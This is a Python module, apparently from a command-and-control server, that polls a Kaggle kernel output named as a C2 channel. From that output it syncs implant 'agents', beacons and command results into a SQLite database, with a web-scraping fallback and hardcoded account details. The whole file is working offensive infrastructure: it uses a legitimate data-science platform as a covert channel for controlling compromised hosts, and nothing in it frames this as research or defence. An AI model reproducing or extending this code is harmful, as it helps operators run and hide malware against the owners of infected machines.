#!/usr/bin/env python3
"""
Dataset C2 Poller - Automatically syncs Kaggle kernel output to C2 database

This runs as a background thread in the C2 server, periodically checking
kernel output and syncing agents/beacons to the database.
"""

import os
import json
import time
import sqlite3
import tempfile
import threading
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, List, Optional


class DatasetC2Poller:
    """Background poller for Dataset C2"""
    
    def __init__(self, db_path: str, kaggle_username: str, kaggle_key: str, 
                 kernel_slug: str, interval: int = 60):
        self.db_path = db_path
        self.kaggle_username = kaggle_username
        self.kaggle_key = kaggle_key
        self.kernel_slug = kernel_slug
        self.interval = interval
        self.running = False
        self.thread = None
        
    def start(self):
        """Start the poller thread"""
        if self.running:
            return
        
        self.running = True
        self.thread = threading.Thread(target=self._poll_loop, daemon=True)
        self.thread.start()
        print(f"[DATASET C2 POLLER] Started (interval: {self.interval}s)")
    
    def stop(self):
        """Stop the poller"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        print("[DATASET C2 POLLER] Stopped")
    
    def _poll_loop(self):
        """Main polling loop"""
        while self.running:
            try:
                self._sync_kernel_output()
            except Exception as e:
                print(f"[DATASET C2 POLLER] Error: {e}")
            
            # Sleep in small increments to allow quick shutdown
            for _ in range(self.interval):
                if not self.running:
                    break
                time.sleep(1)
    
    def _sync_kernel_output(self):
        """Download kernel output and sync to database"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Download kernel output
            env = {
                **os.environ,
                "KAGGLE_USERNAME": self.kaggle_username,
                "KAGGLE_KEY": self.kaggle_key
            }
            
            result = subprocess.run(
                ["kaggle", "kernels", "output", self.kernel_slug, "-p", tmpdir],
                capture_output=True, text=True, timeout=120,
                env=env
            )
            
            if result.returncode != 0:
                # Try alternative method - web scraping
                self._sync_via_web()
                return
            
            tmpdir_path = Path(tmpdir)
            
            # Sync agents
            agents_file = tmpdir_path / "c2-agents.json"
            if agents_file.exists():
                self._sync_agents(agents_file)
            
            # Sync beacons
            beacons_file = tmpdir_path / "c2-beacons.json"
            if beacons_file.exists():
                self._sync_beacons(beacons_file)
            
            # Sync output
            output_file = tmpdir_path / "c2-output.json"
            if output_file.exists():
                self._sync_output(output_file)
    
    def _sync_via_web(self):
        """Alternative sync via web scraping when API fails"""
        try:
            import requests
            
            # Try to get kernel status page
            url = f"https://www.kaggle.com/code/{self.kernel_slug}"
            resp = requests.get(url, timeout=30)
            
            if resp.status_code == 200:
                # Look for agent ID patterns in the page
                import re
                matches = re.findall(r'kaggle-[a-f0-9]{8}', resp.text)
                
                if matches:
                    # Found agent IDs, update database
                    agent_id = matches[0]
                    self._update_agent_in_db(agent_id, "web-scrape")
                    
        except Exception as e:
            print(f"[DATASET C2 POLLER] Web sync error: {e}")
    
    def _sync_agents(self, agents_file: Path):
        """Sync agents from c2-agents.json to database"""
        try:
            agents = json.loads(agents_file.read_text())
            if not isinstance(agents, list):
                agents = [agents] if isinstance(agents, dict) else []
            
            conn = sqlite3.connect(self.db_path)
            
            for agent in agents:
                agent_id = agent.get("id", "")
                if not agent_id:
                    continue
                
                # Check if exists
                existing = conn.execute(
                    "SELECT id FROM agents WHERE id=?", (agent_id,)
                ).fetchone()
                
                if existing:
                    # Update
                    conn.execute("""
                        UPDATE agents SET 
                            last_seen=datetime('now'),
                            is_alive=1,
                            hostname=?
                        WHERE id=?
                    """, (agent.get("hostname", ""), agent_id))
                else:
                    # Insert
                    conn.execute("""
                        INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    """, (
                        agent_id,
                        agent.get("hostname", ""),
                        agent.get("username", "kaggle"),
                        agent.get("os", "linux"),
                        agent.get("arch", "x64"),
                        "kaggle",
                        agent.get("platform_type", "kaggle")
                    ))
                
                print(f"[DATASET C2 POLLER] Synced agent: {agent_id}")
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[DATASET C2 POLLER] Agent sync error: {e}")
    
    def _sync_beacons(self, beacons_file: Path):
        """Sync beacons from c2-beacons.json"""
        try:
            data = json.loads(beacons_file.read_text())
            beacons = data.get("beacons", [])
            
            # Get latest beacon per agent
            latest = {}
            for beacon in beacons:
                agent_id = beacon.get("agent_id", "")
                if agent_id:
                    latest[agent_id] = beacon
            
            # Update agents based on beacons
            conn = sqlite3.connect(self.db_path)
            
            for agent_id, beacon in latest.items():
                status = beacon.get("status", "active")
                is_alive = 1 if status == "active" else 0
                
                conn.execute("""
                    UPDATE agents SET 
                        last_seen=datetime('now'),
                        is_alive=?
                    WHERE id=?
                """, (is_alive, agent_id))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[DATASET C2 POLLER] Beacon sync error: {e}")
    
    def _sync_output(self, output_file: Path):
        """Sync command results from c2-output.json"""
        try:
            data = json.loads(output_file.read_text())
            results = data.get("results", [])
            
            # Process results (could trigger events, update tasks, etc.)
            for result in results:
                agent_id = result.get("agent_id", "")
                command_id = result.get("command_id", "")
                print(f"[DATASET C2 POLLER] Result from {agent_id}: {command_id}")
                
        except Exception as e:
            print(f"[DATASET C2 POLLER] Output sync error: {e}")
    
    def _update_agent_in_db(self, agent_id: str, source: str = "poller"):
        """Update or insert agent in database"""
        conn = sqlite3.connect(self.db_path)
        
        existing = conn.execute(
            "SELECT id FROM agents WHERE id=?", (agent_id,)
        ).fetchone()
        
        if existing:
            conn.execute("""
                UPDATE agents SET last_seen=datetime('now'), is_alive=1
                WHERE id=?
            """, (agent_id,))
        else:
            conn.execute("""
                INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (agent_id, agent_id.split("-")[-1] if "-" in agent_id else "unknown",
                  "kaggle", "linux", "x64", "kaggle", "kaggle"))
        
        conn.commit()
        conn.close()


# Global poller instance
_poller: Optional[DatasetC2Poller] = None


def start_poller(db_path: str, kaggle_username: str, kaggle_key: str,
                 kernel_slug: str = "cassandradixon320631/c2-channel",
                 interval: int = 60):
    """Start the global Dataset C2 poller"""
    global _poller
    
    if _poller and _poller.running:
        return _poller
    
    _poller = DatasetC2Poller(db_path, kaggle_username, kaggle_key, kernel_slug, interval)
    _poller.start()
    return _poller


def stop_poller():
    """Stop the global poller"""
    global _poller
    
    if _poller:
        _poller.stop()
        _poller = None


def get_poller() -> Optional[DatasetC2Poller]:
    """Get the global poller instance"""
    return _poller


if __name__ == "__main__":
    # Test the poller
    import sys
    
    db_path = sys.argv[1] if len(sys.argv) > 1 else "/mnt/F/C2_server-main/data/c2.db"
    username = sys.argv[2] if len(sys.argv) > 2 else "cassandradixon320631"
    api_key = sys.argv[3] if len(sys.argv) > 3 else os.environ.get("KAGGLE_KEY", "")
    
    if not api_key:
        print("Error: KAGGLE_KEY required")
        sys.exit(1)
    
    poller = start_poller(db_path, username, api_key)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_poller()
